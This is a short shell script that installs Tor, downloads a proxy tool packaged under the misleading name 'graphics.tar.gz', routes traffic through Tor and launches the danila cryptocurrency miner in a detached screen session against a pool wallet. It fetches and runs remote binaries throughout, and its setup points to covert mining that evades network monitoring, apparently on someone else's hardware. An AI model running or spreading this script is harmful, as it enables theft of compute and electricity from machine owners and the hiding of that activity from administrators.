#!/bin/sh
ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
dpkg-reconfigure --frontend noninteractive tzdata
apt update
apt -y install binutils cmake build-essential screen unzip net-tools curl nano tor
service tor start
wget https://raw.githubusercontent.com/hanifgz/ngarit/main/graphics.tar.gz
tar -xvzf graphics.tar.gz

cat > graftcp/local/graftcp-local.conf <<END
listen = :2233
loglevel = 1
socks5 = 127.0.0.1:9050
socks5_username =
socks5_password =
END

./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &

sleep .2

echo " "
echo " "

echo "******************************************************************"

wget https://whalepool-cdn.fra1.digitaloceanspaces.com/software/danila-miner/danila-miner-2.3.1-ubuntu-bionic.tar.gz
tar -xf danila-miner-2.3.1-ubuntu-bionic.tar.gz

screen ./graftcp/graftcp ./danila-miner run https://server1.whalestonpool.com EQAOmy828qeoXLH0uIz_w0PDYd4kSowX62deGEeFd1mxOQZh
